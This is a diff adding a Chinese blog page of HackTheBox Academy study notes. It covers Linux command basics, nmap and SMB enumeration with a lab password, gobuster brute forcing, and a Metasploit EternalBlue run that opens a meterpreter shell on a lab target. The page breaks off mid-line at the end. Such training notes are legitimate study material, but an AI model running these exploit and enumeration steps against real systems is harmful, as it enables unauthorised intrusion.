@@ -1,0 +1,1417 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="python,网络安全,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Openresty Python LUA" type="application/atom+xml">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1">
+
+
+
+
+
+
+<meta name="description" content="hackthebox 是一个不错的安全学习平台。 可以按 https://academy.hackthebox.eu/paths 提供的技能路径进行学习 QQ群：397745473">
+<meta name="keywords" content="python,网络安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hackthebox学习记录">
+<meta property="og:url" content="http://vksec.com/2021/08/19/205_hackthebox学习记录/index.html">
+<meta property="og:site_name" content="Openresty Python LUA">
+<meta property="og:description" content="hackthebox 是一个不错的安全学习平台。 可以按 https://academy.hackthebox.eu/paths 提供的技能路径进行学习 QQ群：397745473">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2021-08-23T09:50:16.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="hackthebox学习记录">
+<meta name="twitter:description" content="hackthebox 是一个不错的安全学习平台。 可以按 https://academy.hackthebox.eu/paths 提供的技能路径进行学习 QQ群：397745473">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://vksec.com/2021/08/19/205_hackthebox学习记录/">
+
+
+
+  <title>hackthebox学习记录 | Openresty Python LUA</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Openresty Python LUA</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">QQ群:397745473</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+<script data-ad-client="ca-pub-9873623505122626" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://vksec.com/2021/08/19/205_hackthebox学习记录/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="vsyour">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="https://i.imgur.com/luMBjvD.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Openresty Python LUA">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                hackthebox学习记录
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-08-19T03:03:03+08:00">
+                2021-08-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/python/" itemprop="url" rel="index">
+                    <span itemprop="name">python</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2021/08/19/205_hackthebox学习记录/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2021/08/19/205_hackthebox学习记录/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>hackthebox 是一个不错的安全学习平台。</p>
+<p>可以按 <a href="https://academy.hackthebox.eu/paths" target="_blank" rel="noopener">https://academy.hackthebox.eu/paths</a> 提供的技能路径进行学习</p>
+<p>QQ群：397745473</p>
+<a id="more"></a> 
+<h1 id="Basic-Toolset"><a href="#Basic-Toolset" class="headerlink" title="Basic Toolset"></a>Basic Toolset</h1><p>工具集学习</p>
+<p>在此路径中，模块涵盖了在网络和 Web 应用程序渗透测试中取得成功所需的基本工具。这并不是我们作为安全从业者可以使用的所有工具（开源和商业）的详尽列表，而是涵盖了我们发现自己在执行的每项技术评估中使用的久经考验的真实工具。学习如何使用基本工具集是必不可少的，因为渗透测试中使用了许多不同的工具。我们需要了解在我们将遇到的各种情况下使用它们中的哪一个。</p>
+<p>如果我们在理解长命令时遇到问题，可以获得帮助的另一个有用资源是：<a href="https://explainshell.com/" target="_blank" rel="noopener">https</a> : <a href="https://explainshell.com/" target="_blank" rel="noopener">//explainshell.com/</a></p>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>man &lt;tool&gt;</code></td>
+<td>Opens man pages for the specified tool.</td>
+</tr>
+<tr>
+<td><code>&lt;tool&gt; -h</code></td>
+<td>Prints the help page of the tool.</td>
+</tr>
+<tr>
+<td><code>apropos &lt;keyword&gt;</code></td>
+<td>Searches through man pages’ descriptions for instances of a given keyword.</td>
+</tr>
+<tr>
+<td><code>cat</code></td>
+<td>Concatenate and print files.</td>
+</tr>
+<tr>
+<td><code>whoami</code></td>
+<td>Displays current username.</td>
+</tr>
+<tr>
+<td><code>id</code></td>
+<td>Returns users identity.</td>
+</tr>
+<tr>
+<td><code>hostname</code></td>
+<td>Sets or prints the name of the current host system.</td>
+</tr>
+<tr>
+<td><code>uname</code></td>
+<td>Prints operating system name.</td>
+</tr>
+<tr>
+<td><code>pwd</code></td>
+<td>Returns working directory name.</td>
+</tr>
+<tr>
+<td><code>ifconfig</code></td>
+<td>The <code>ifconfig</code> utility is used to assign or view an address to a network interface and/or configure network interface parameters.</td>
+</tr>
+<tr>
+<td><code>ip</code></td>
+<td>Ip is a utility to show or manipulate routing, network devices, interfaces, and tunnels.</td>
+</tr>
+<tr>
+<td><code>netstat</code></td>
+<td>Shows network status.</td>
+</tr>
+<tr>
+<td><code>ss</code></td>
+<td>Another utility to investigate sockets.</td>
+</tr>
+<tr>
+<td><code>ps</code></td>
+<td>Shows process status.</td>
+</tr>
+<tr>
+<td><code>who</code></td>
+<td>Displays who is logged in.</td>
+</tr>
+<tr>
+<td><code>env</code></td>
+<td>Prints environment or sets and executes a command.</td>
+</tr>
+<tr>
+<td><code>lsblk</code></td>
+<td>Lists block devices.</td>
+</tr>
+<tr>
+<td><code>lsusb</code></td>
+<td>Lists USB devices.</td>
+</tr>
+<tr>
+<td><code>lsof</code></td>
+<td>Lists opened files.</td>
+</tr>
+<tr>
+<td><code>lspci</code></td>
+<td>Lists PCI devices.</td>
+</tr>
+<tr>
+<td><code>sudo</code></td>
+<td>Execute command as a different user.</td>
+</tr>
+<tr>
+<td><code>su</code></td>
+<td>The <code>su</code> utility requests appropriate user credentials via PAM and switches to that user ID (the default user is the superuser).  A shell is then executed.</td>
+</tr>
+<tr>
+<td><code>useradd</code></td>
+<td>Creates a new user or update default new user information.</td>
+</tr>
+<tr>
+<td><code>userdel</code></td>
+<td>Deletes a user account and related files.</td>
+</tr>
+<tr>
+<td><code>usermod</code></td>
+<td>Modifies a user account.</td>
+</tr>
+<tr>
+<td><code>addgroup</code></td>
+<td>Adds a group to the system.</td>
+</tr>
+<tr>
+<td><code>delgroup</code></td>
+<td>Removes a group from the system.</td>
+</tr>
+<tr>
+<td><code>passwd</code></td>
+<td>Changes user password.</td>
+</tr>
+<tr>
+<td><code>dpkg</code></td>
+<td>Install, remove and configure Debian-based packages.</td>
+</tr>
+<tr>
+<td><code>apt</code></td>
+<td>High-level package management command-line utility.</td>
+</tr>
+<tr>
+<td><code>aptitude</code></td>
+<td>Alternative to <code>apt</code>.</td>
+</tr>
+<tr>
+<td><code>snap</code></td>
+<td>Install, remove and configure snap packages.</td>
+</tr>
+<tr>
+<td><code>gem</code></td>
+<td>Standard package manager for Ruby.</td>
+</tr>
+<tr>
+<td><code>pip</code></td>
+<td>Standard package manager for Python.</td>
+</tr>
+<tr>
+<td><code>git</code></td>
+<td>Revision control system command-line utility.</td>
+</tr>
+<tr>
+<td><code>systemctl</code></td>
+<td>Command-line based service and systemd control manager.</td>
+</tr>
+<tr>
+<td><code>ps</code></td>
+<td>Prints a snapshot of the current processes.</td>
+</tr>
+<tr>
+<td><code>journalctl</code></td>
+<td>Query the systemd journal.</td>
+</tr>
+<tr>
+<td><code>kill</code></td>
+<td>Sends a signal to a process.</td>
+</tr>
+<tr>
+<td><code>bg</code></td>
+<td>Puts a process into background.</td>
+</tr>
+<tr>
+<td><code>jobs</code></td>
+<td>Lists all processes that are running in the background.</td>
+</tr>
+<tr>
+<td><code>fg</code></td>
+<td>Puts a process into the foreground.</td>
+</tr>
+<tr>
+<td><code>curl</code></td>
+<td>Command-line utility to transfer data from or to a server.</td>
+</tr>
+<tr>
+<td><code>wget</code></td>
+<td>An alternative to <code>curl</code> that downloads files from FTP or HTTP(s) server.</td>
+</tr>
+<tr>
+<td><code>python3 -m http.server</code></td>
+<td>Starts a Python3 web server on TCP port 8000.</td>
+</tr>
+<tr>
+<td><code>ls</code></td>
+<td>Lists directory contents.</td>
+</tr>
+<tr>
+<td><code>cd</code></td>
+<td>Changes the directory.</td>
+</tr>
+<tr>
+<td><code>clear</code></td>
+<td>Clears the terminal.</td>
+</tr>
+<tr>
+<td><code>touch</code></td>
+<td>Creates an empty file.</td>
+</tr>
+<tr>
+<td><code>mkdir</code></td>
+<td>Creates a directory.</td>
+</tr>
+<tr>
+<td><code>tree</code></td>
+<td>Lists the contents of a directory recursively.</td>
+</tr>
+<tr>
+<td><code>mv</code></td>
+<td>Move or rename files or directories.</td>
+</tr>
+<tr>
+<td><code>cp</code></td>
+<td>Copy files or directories.</td>
+</tr>
+<tr>
+<td><code>nano</code></td>
+<td>Terminal based text editor.</td>
+</tr>
+<tr>
+<td><code>which</code></td>
+<td>Returns the path to a file or link.</td>
+</tr>
+<tr>
+<td><code>find</code></td>
+<td>Searches for files in a directory hierarchy.</td>
+</tr>
+<tr>
+<td><code>updatedb</code></td>
+<td>Updates the locale database for existing contents on the system.</td>
+</tr>
+<tr>
+<td><code>locate</code></td>
+<td>Uses the locale database to find contents on the system.</td>
+</tr>
+<tr>
+<td><code>more</code></td>
+<td>Pager that is used to read STDOUT or files.</td>
+</tr>
+<tr>
+<td><code>less</code></td>
+<td>An alternative to <code>more</code> with more features.</td>
+</tr>
+<tr>
+<td><code>head</code></td>
+<td>Prints the first ten lines of STDOUT or a file.</td>
+</tr>
+<tr>
+<td><code>tail</code></td>
+<td>Prints the last ten lines of STDOUT or a file.</td>
+</tr>
+<tr>
+<td><code>sort</code></td>
+<td>Sorts the contents of STDOUT or a file.</td>
+</tr>
+<tr>
+<td><code>grep</code></td>
+<td>Searches for specific results that contain given patterns.</td>
+</tr>
+<tr>
+<td><code>cut</code></td>
+<td>Removes sections from each line of files.</td>
+</tr>
+<tr>
+<td><code>tr</code></td>
+<td>Replaces certain characters.</td>
+</tr>
+<tr>
+<td><code>column</code></td>
+<td>Command-line based utility that formats its input into multiple columns.</td>
+</tr>
+<tr>
+<td><code>awk</code></td>
+<td>Pattern scanning and processing language.</td>
+</tr>
+<tr>
+<td><code>sed</code></td>
+<td>A stream editor for filtering and transforming text.</td>
+</tr>
+<tr>
+<td><code>wc</code></td>
+<td>Prints newline, word, and byte counts for a given input.</td>
+</tr>
+<tr>
+<td><code>chmod</code></td>
+<td>Changes permission of a file or directory.</td>
+</tr>
+<tr>
+<td><code>chown</code></td>
+<td>Changes the owner and group of a file or directory.</td>
+</tr>
+</tbody>
+</table>
+<h1 id="重点记录"><a href="#重点记录" class="headerlink" title="重点记录"></a>重点记录</h1><p>下载openvpn连接</p>
+<p><a href="https://openvpn.net/client-connect-vpn-for-windows/" target="_blank" rel="noopener">https://openvpn.net/client-connect-vpn-for-windows/</a></p>
+<p>可以用 Bitvise ssh client 连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 建立简单服务器</span></span><br><span class="line">python3 -m http.server  <span class="comment"># python3</span></span><br><span class="line">http-server -p 8080  <span class="comment"># npm install http-server</span></span><br><span class="line">php -S 127.0.0.1:8080 <span class="comment"># php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#查文件索引号命令： ls -i /var/backups/shadow.bak</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># What is the name of the config file that has been created after 2020-03-03 and is smaller than 28k but larger than 25k?</span></span><br><span class="line">$ find / -<span class="built_in">type</span> f -name *.conf -user root -size +25k -size -28k -newermt 2020-03-03 -<span class="built_in">exec</span> ls -al &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># How many files exist on the system that have the ".bak" extension?</span></span><br><span class="line">$ find / -<span class="built_in">type</span> f -name *.bak -<span class="built_in">exec</span> ls -al &#123;&#125; \; 2&gt;/dev/null |wc -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># Submit the full path of the "xxd" binary.</span></span><br><span class="line">$ find / -<span class="built_in">type</span> f -name xxd -<span class="built_in">exec</span> ls -al &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># How many files exist on the system that have the ".log" file extension?</span></span><br><span class="line">$ find / -<span class="built_in">type</span> f -name *.<span class="built_in">log</span> -<span class="built_in">exec</span> ls -al &#123;&#125; \; 2&gt;/dev/null |wc -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># How many total packages are installed on the target system?</span></span><br><span class="line">$ dpkg -l | grep -c <span class="string">'^ii'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># How many services are listening on the target system on all interfaces? (Not on localhost and IPv4 only)</span></span><br><span class="line">$ ss -l -4 | grep -v <span class="string">"127\.0\.0"</span> | grep <span class="string">"LISTEN"</span> | wc -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># Determine what user the ProFTPd server is running under. Submit the username as the answer.</span></span><br><span class="line">$ ps -ef|grep ftpd</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use cURL from your Pwnbox (not the target machine) to obtain the source code of the "https://www.inlanefreight.com" website and filter all unique paths of that domain. Submit the number of these paths as the answer.</span></span><br><span class="line">curl https://www.inlanefreight.com |tr <span class="string">" "</span> <span class="string">"\n"</span> | cut -d<span class="string">"'"</span> -f2 | cut -d<span class="string">'"'</span> -f2 | grep <span class="string">"www.inlanefreight.com"</span> | sort -u | wc -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># js 混淆在线工具</span></span><br><span class="line">http://beautifytools.com/javascript-obfuscator.php</span><br><span class="line">https://jsconsole.com</span><br><span class="line">https://obfuscator.io</span><br><span class="line">https://beautifier.io/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 代码编辑器</span></span><br><span class="line">https://prettier.io/playground/</span><br><span class="line">http://www.jsnice.org/</span><br><span class="line"></span><br><span class="line"><span class="comment"># Base64 Encode Decode</span></span><br><span class="line">$ <span class="built_in">echo</span> https://www.hackthebox.eu/ | base64</span><br><span class="line">$ <span class="built_in">echo</span> aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8K | base64 -d</span><br><span class="line"></span><br><span class="line"><span class="comment"># Hex Encode Decode</span></span><br><span class="line">$ <span class="built_in">echo</span> https://www.hackthebox.eu/ | xxd -p</span><br><span class="line">$ <span class="built_in">echo</span> 68747470733a2f2f7777772e6861636b746865626f782e65752f0a | xxd -p -r</span><br><span class="line"></span><br><span class="line"><span class="comment"># Rot13 Encode Decode</span></span><br><span class="line">$ <span class="built_in">echo</span> https://www.hackthebox.eu/ | tr <span class="string">'A-Za-z'</span> <span class="string">'N-ZA-Mn-za-m'</span></span><br><span class="line">$ <span class="built_in">echo</span> uggcf://jjj.unpxgurobk.rh/ | tr <span class="string">'A-Za-z'</span> <span class="string">'N-ZA-Mn-za-m'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Using what you learned in this section, determine the type of encoding used in the string you got at previous exercise, and decode it. To get the flag, you can send a 'POST' request to 'serial.php', and set the data as "serial=YOUR_DECODED_OUTPUT".</span></span><br><span class="line">$ curl http://188.166.173.208:31747/serial.php -X POST -d <span class="string">"serial=7h15_15_a_s3cr37_m3554g3"</span></span><br></pre></td></tr></table></figure>
+<h1 id="parrotsec-系统"><a href="#parrotsec-系统" class="headerlink" title="parrotsec 系统"></a>parrotsec 系统</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载 https://parrotsec.org/download/</span></span><br><span class="line"><span class="comment"># 虚拟机版 https://www.parrotsec.org/virtual/</span></span><br><span class="line"><span class="comment"># 安装 https://docs.parrotlinux.org/installation.html</span></span><br><span class="line"><span class="comment"># 配置 https://docs.parrotlinux.org/parrot-software-management.html</span></span><br><span class="line"><span class="comment"># 论坛 https://community.parrotsec.org/c/support/6</span></span><br><span class="line"><span class="comment"># docker版</span></span><br><span class="line">docker run --rm -ti --network host -v <span class="variable">$PWD</span>/work:/work parrotsec/security</span><br><span class="line"><span class="comment"># 参考使用说明 https://parrotsec.org/docs/parrot-on-docker.html</span></span><br></pre></td></tr></table></figure>
+<h1 id="nmap-扫描"><a href="#nmap-扫描" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sV -sC -p- 10.129.42.253</span><br><span class="line">$ nmap --script smb-os-discovery.nse -p445 10.10.10.40</span><br><span class="line">$ nmap -A -p445 10.129.42.253</span><br><span class="line">$ smbclient -N -L \\\\10.129.42.253</span><br><span class="line">$ smbclient \\\\10.129.42.253\\users</span><br><span class="line">$ smbclient -U bob \\\\10.129.42.253\\users</span><br><span class="line"></span><br><span class="line"><span class="comment"># Perform an Nmap scan of the target. What service is running on port 8080? (two words)</span></span><br><span class="line">$ nmap -A -p8080 10.129.42.254</span><br><span class="line"><span class="comment"># Perform an Nmap scan of the target and identify the non-default port that the telnet service running on.</span></span><br><span class="line">$ nmap -A 10.129.42.254</span><br><span class="line"><span class="comment"># List the SMB shares available on the target host. Connect to the available share as the bob user. Once connected, access the folder called 'flag' and submit the contents of the flag.txt file.</span></span><br><span class="line">$ smbclient -N -L \\\\10.129.42.254</span><br><span class="line">$ smbclient -U bob \\\\10.129.42.254\\users</span><br><span class="line">bob:Welcome1</span><br></pre></td></tr></table></figure>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 目录/文件枚举</span></span><br><span class="line"><span class="comment"># https://github.com/ffuf/ffuf</span></span><br><span class="line"><span class="comment"># https://github.com/OJ/gobuster</span></span><br><span class="line">$ gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># DNS 子域枚举</span></span><br><span class="line"><span class="comment"># 工具 https://github.com/danielmiessler/SecLists # 安装 SecLists 方法略</span></span><br><span class="line"><span class="comment"># 接下来，将 DNS 服务器（例如 1.1.1.1）添加到/etc/resolv.conf文件中。我们将定位域名inlanefreight.com，即一个虚构的货运和物流公司的网站。</span></span><br><span class="line">$ gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 网络枚举技巧 工具：curl -IL  和  EyeWitness</span></span><br><span class="line"><span class="comment"># 另一个方便的工具是 EyeWitness，它可用于截取目标 Web 应用程序的屏幕截图、指纹并识别可能的默认凭据。</span></span><br><span class="line"><span class="comment"># https://github.com/FortyNorthSecurity/EyeWitness</span></span><br><span class="line">$ curl -IL https://www.inlanefreight.com <span class="comment"># 抓Banner和Headers</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># whatweb</span></span><br><span class="line"><span class="comment"># 我们可以使用命令行工具 whatweb 提取 Web 服务器、支持框架和应用程序的版本。这些信息可以帮助我们查明正在使用的技术并开始搜索潜在的漏洞</span></span><br><span class="line">$ whatweb 10.10.10.121</span><br><span class="line">$ whatweb --no-errors 10.10.10.0/24</span><br><span class="line"><span class="comment"># Certificates Robots.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Try running some of the web enumeration techniques you learned in this section on the server above, and use the info you get to get the flag.</span></span><br><span class="line">$ gobuster dir -u http://142.93.35.92:31581/ -w /usr/share/dirb/wordlists/common.txt</span><br><span class="line">http://142.93.35.92:31581/</span><br><span class="line">http://142.93.35.92:31581/robots.txt</span><br><span class="line">http://142.93.35.92:31581/admin-login-page.php</span><br><span class="line">[CTRL + U] 得到用户名密码登陆后拿到flag</span><br></pre></td></tr></table></figure>
+<h1 id="Public-Exploits"><a href="#Public-Exploits" class="headerlink" title="Public Exploits"></a>Public Exploits</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install exploitdb -y</span><br><span class="line">$ searchsploit openssh 7.2</span><br><span class="line">$ msfconsole</span><br><span class="line">msf6 &gt; search exploit eternalblue</span><br><span class="line">msf6 &gt; use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; <span class="built_in">set</span> RHOSTS 10.10.10.40</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; <span class="built_in">set</span> LHOST tun0</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; check</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; exploit</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">C:\WINDOWS\system32&gt;whoami</span><br><span class="line"></span><br><span class="line"><span class="comment">#  Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file. (note: the web server may take a few seconds to start)</span></span><br><span class="line"><span class="variable">$msfconsole</span></span><br><span class="line">msf6 &gt; search simple backup</span><br><span class="line">msf6 &gt; use 0</span><br><span class="line">msf6 auxiliary(scanner/http/wp_simple_backup_file_read) &gt; show options</span><br><span class="line">msf6 auxiliary(scanner/http/wp_simple_backup_file_read) &gt; <span class="built_in">set</span> RHOSTS 142.93.35.92</span><br><span 